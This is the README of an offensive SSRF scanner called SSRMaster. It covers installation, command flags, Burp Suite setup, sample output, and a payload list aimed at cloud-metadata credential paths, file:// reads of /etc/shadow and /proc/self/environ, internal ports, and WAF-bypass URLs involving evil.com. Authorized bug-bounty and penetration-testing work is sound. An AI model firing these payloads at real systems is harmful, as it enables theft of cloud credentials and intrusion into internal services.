# 🚀 SSRMaster v4.0: Infinite Intelligence

**The Ultimate AI-Powered Server-Side Request Forgery (SSRF) Exploitation Framework**

[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=for-the-badge&logo=go)](https://golang.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
[![Version](https://img.shields.io/badge/Version-4.0-blue?style=for-the-badge)](https://github.com/supreamhacker/ssrmaster)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey?style=for-the-badge)]()

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Installation](#-installation)
- [Usage](#-usage)
- [Flags Reference](#-flags-reference)
- [Examples](#-examples)
- [Burp Suite Integration](#-burp-suite-integration)
- [Payload Arsenal](#-payload-arsenal)
- [Screenshots](#-example-output)
- [Disclaimer](#-disclaimer--ethical-use)
- [License](#-license)

---

## 🎯 Overview

**SSRMaster v4.0** is an enterprise-grade, AI-adaptive SSRF exploitation tool written in **Golang**. It combines autonomous web crawling, intelligent parameter detection, and a massive payload arsenal to find Server-Side Request Forgery vulnerabilities in modern web applications.

Unlike traditional scanners, SSRMaster:
- 🕷️ **Auto-crawls** target websites (500+ paths, recursive depth up to 5 levels)
- 🧠 **AI Mutation Engine** generates unlimited payload variations
- 🔍 **Smart Parameter Detection** with 500+ keywords
- 💥 **8000+ Payloads** covering cloud metadata, WAF bypass, DNS rebinding
- 🔗 **Burp Suite Integration** for full visibility
- 🌐 **curl-like Auto-Crawler** extracts forms, JS endpoints, hidden links

---

## ✨ Features

### 🕷️ Autonomous Auto-Crawler

- **500+ Crawl Paths** (categorized: web, API, admin, files, config, CMS, cloud, debug)
- **Recursive Crawling** with `-depth` flag (0-5 levels)
- **JavaScript Parsing** - extracts endpoints from `fetch()`, `axios`, `ajax`, `XMLHttpRequest`
- **Form Auto-Discovery** - detects forms and adds them to attack queue
- **Smart Deduplication** - tracks visited URLs to avoid loops

### 💥 8000+ Payload Arsenal

| Category | Count | Description |

|----------|-------|-------------|
| Cloud Metadata | 700+ | AWS, GCP, Azure, DigitalOcean |
| Internal Services | 1000+ | localhost, 127.0.0.1, internal ports |
| File Protocol | 500+ | `file://`, sensitive system files |
| WAF Bypass | 5000+ | Encoding, unicode, null bytes, redirects |
| DNS Rebinding | 1000+ | nip.io, sslip.io, localtest.me |
| AI Mutated | Unlimited | Multi-layer encoding combinations |

### 🧠 AI Mutation Engine

- Base64 encoding
- Hex encoding
- URL encoding (single & double)
- Unicode character substitution
- Null byte injection
- Tab/space injection
- Path traversal variants

### 🔍 Smart Parameter Detection

- **500+ Keywords** automatically detect SSRF-susceptible parameters
- Supports both **Query Parameters** and **JSON Body**
- Context-aware parameter classification

### 🔗 Burp Suite Integration

- All requests routed through Burp proxy
- Custom headers: `X-SSRF-Hunter: True`, `X-AI-Commander: True`
- Filter HTTP History: `X-AI-Commander: True`

### 🌐 Multi-Protocol Support

- HTTP/HTTPS
- File Protocol (`file://`)
- Gopher Protocol
- Dict Protocol
- LDAP Protocol

### ⚡ Performance

- **Smart Concurrency** - Worker pool with semaphore
- **Configurable Delay** - Avoid rate limiting
- **Proxy Support** - Burp, ZAP, or custom proxies
- **OOB Detection** - Blind SSRF via DNS/HTTP callbacks

---

## 📦 Installation

### Method 1: Go Install (Recommended)

```bash

go install github.com/supreamhacker/ssrmaster@latest


Note: Ensure $GOPATH/bin or $HOME/go/bin is in your system's PATH.

Method 2: Build from Source

git clone https://github.com/supreamhacker/ssrmaster.git
cd ssrmaster
go mod tidy
go build -o ssrmaster
chmod +x ssrmaster


Method 3: Quick Build (Linux/macOS)

git clone https://github.com/supreamhacker/ssrmaster.git
cd ssrmaster
go build -o ssrmaster && chmod +x ssrmaster


Verify Installation

./ssrmaster -h



🛠️ Usage

Basic Syntax

./ssrmaster -d <domain> [flags]

Quick Start

# Auto-crawl and attack a domain

./ssrmaster -d https://target.com

# With Burp Suite proxy

./ssrmaster -d https://target.com -proxy http://127.0.0.1:8080

# With custom concurrency and delay

./ssrmaster -d https://target.com -c 50 -delay 20ms

# Save results to JSON

./ssrmaster -d https://target.com -o results.json


🚩 Flags Reference


Flag                     Type               Default                    Description


-d                       string               -                        Domain to auto-crawl and attack (main flag)

-req                     string               -                        Raw HTTP Request file (from Burp Suite) - optional

-proxy                   string        http://127.0.0.1:8080           Burp Suite / Proxy URL

-c                        int                  50                      Max concurrent requests

-delay                  duration              20ms                     Delay between requests

-o                       string                -                       Output JSON file

-oob                     string                -                       OOB domain for Blind SSRF detection

-w                       string                -                       Custom wordlist file (keywords)

-depth                    int                  2                       Crawl depth (0-5 levels)


📚 Examples

Example 1: Basic Auto-Crawl Attack

./ssrmaster -d https://target.com


Example 2: With Burp Suite Proxy

./ssrmaster -d https://target.com -proxy http://127.0.0.1:8080


Example 3: Deep Recursive Crawling

./ssrmaster -d https://target.com -depth 3 -c 50


Example 4: Blind SSRF with OOB Detection

./ssrmaster -d https://target.com -oob abc123.interact.sh


Example 5: With Raw Request (from Burp)

./ssrmaster -req request.txt -proxy http://127.0.0.1:8080


Example 6: Combined Mode (Domain + Raw Request)

./ssrmaster -d https://target.com -req request.txt -c 50 -delay 20ms


Example 7: Custom Wordlist

./ssrmaster -d https://target.com -w custom_keywords.txt


Example 8: Save Results to JSON

./ssrmaster -d https://target.com -o ssrf_results.json -c 50


Example 9: Complete Elite Command

./ssrmaster -d https://target.com \
  -proxy http://127.0.0.1:8080 \
  -depth 3 \
  -c 50 \
  -delay 20ms \
  -oob abc123.interact.sh \
  -w custom.txt \
  -o results.json


Example 10: Linux VM + Windows Burp Setup

# When Burp is on Windows host (192.168.118.1) and tool runs in Linux VM
./ssrmaster -d https://target.com -proxy http://192.168.118.1:8080 -c 50


🔗 Burp Suite Integration

Step 1: Configure Burp Proxy

Open Burp Suite

Go to Proxy → Proxy Settings

Under "Proxy Listeners", ensure 127.0.0.1:8080 is running

For remote access (VM setup), edit listener → Bind to All interfaces


Step 2: Run SSRMaster with Proxy

./ssrmaster -d https://target.com -proxy http://127.0.0.1:8080


Step 3: Filter in Burp

Go to Proxy → HTTP History

In the filter bar, type: X-AI-Commander: True

Now you'll see only SSRMaster's AI-generated requests

Step 4: Manual Analysis

Right-click any interesting request → Send to Repeater

Manually tweak payloads and test variations

Use Send to Intruder for advanced fuzzing



💣 Payload Arsenal


Cloud Metadata Attacks

http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01


Internal Services

http://localhost:8080/admin
http://127.0.0.1:3306/
http://127.0.0.1:6379/
http://127.0.0.1:27017/


File Protocol

file:///etc/passwd
file:///etc/shadow
file:///c:/windows/win.ini
file:///proc/self/environ


WAF Bypass Techniques

http://169.254.169.254%00@evil.com
http://0x7f.0x0.0x0.0x1/
http://0177.0.0.1/
http://2130706433/
http://169。254。169。254/
http://evil.com@169.254.169.254/


DNS Rebinding

http://1.0.0.127.nip.io/
http://127.0.0.1.sslip.io/
http://localtest.me/


📊 Example Output


  ____  ____  ____  __  __    _    ____ _____ ____  
 / ___||  _ \|  _ \|  \/  |  / \  / ___|_   _|  _ \ 
 \___ \| |_) | |_) | |\/| | / _ \ \___ \ | | | |_) |
  ___) |  __/|  _ <| |  | |/ ___ \ ___) || | |  _ < 
 |____/|_|   |_| \_\_|  |_/_/   \_\____/ |_| |_| \_\
======================================================
 [!] SSRMaster v4.0: INFINITE INTELLIGENCE
 [!] 500+ Crawl Paths | Recursive Crawling
 [!] JS Parsing | Form Auto-Submit | AI Mutation
======================================================

[*] Generating payload arsenal...
[*] AI Mutation Engine: Expanding payloads...
[+] Total payloads: 8432 | Keywords: 500 | Crawl paths: 500
[*] Auto-Crawling domain: https://target.com (depth: 2)
[+] Discovered 47 endpoints
[*] Launching SSRF attacks on 47 targets...

========== SSRF VULNERABILITIES ==========
[HIT] SSRF (cloud_metadata)
   -> Payload : url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   -> Status  : 200
   -> Evidence: ami-id instance-id security-credentials

[+] Total: 1


🎯 Use Cases

Bug Bounty Hunting:


Test authorized programs on HackerOne, Bugcrowd, Intigriti

Find cloud metadata leaks (AWS, GCP, Azure credentials)

Discover internal service exposure

Penetration Testing:


Internal network mapping via SSRF

Firewall bypass testing

Cloud infrastructure assessment


Security Research:


Study SSRF bypass techniques

Test WAF effectiveness

Analyze application behavior


CTF Challenges:


Solve SSRF-based challenges

Practice exploitation techniques


⚠️ Disclaimer & Ethical Use:

SSRMaster v4.0 is intended strictly for Educational Purposes, Authorized Bug Bounty Hunting, and Internal Security Auditing.

🚫 DO NOT:

Use this tool on systems you don't own or have explicit written permission to test
Attack government, military, or critical infrastructure without authorization
Use this tool for illegal activities or malicious purposes
Distribute exploits or vulnerabilities without responsible disclosure

✅ DO:

Only test targets with explicit authorization (bug bounty programs, your own systems)
Report vulnerabilities responsibly through proper channels
Use this tool to improve security, not to cause harm
Follow all applicable laws and regulations

The authors are not responsible for any misuse or damage caused by this tool. Use it responsibly and ethically. 🛡️

🤝 Contributing

Contributions, issues, and feature requests are welcome!
Fork the repository
Create your feature branch (git checkout -b feature/AmazingFeature)
Commit your changes (git commit -m 'Add some AmazingFeature')
Push to the branch (git push origin feature/AmazingFeature)
Open a Pull Request


📜 License

This project is licensed under the MIT License - see the LICENSE file for details.

🙏 Credits

Inspired by:

SSRFmap - SSRF exploitation framework
Gopherus - Gopher protocol payload generator
Nuclei - Fast vulnerability scanner
Burp Suite - Web security testing platform
Bug bounty reports from HackerOne & Bugcrowd

Built with ❤️ in Go for the cybersecurity community.



🗺️ Roadmap


Multi-threaded OOB server integration

GraphQL SSRF detection

WebSocket SSRF testing

PDF/HTML renderer SSRF

Image parser SSRF (SVG, XXE chains)

Automatic report generation (Markdown/HTML)

Plugin system for custom payloads


Happy Hacking (Ethically)! 🚀🔥

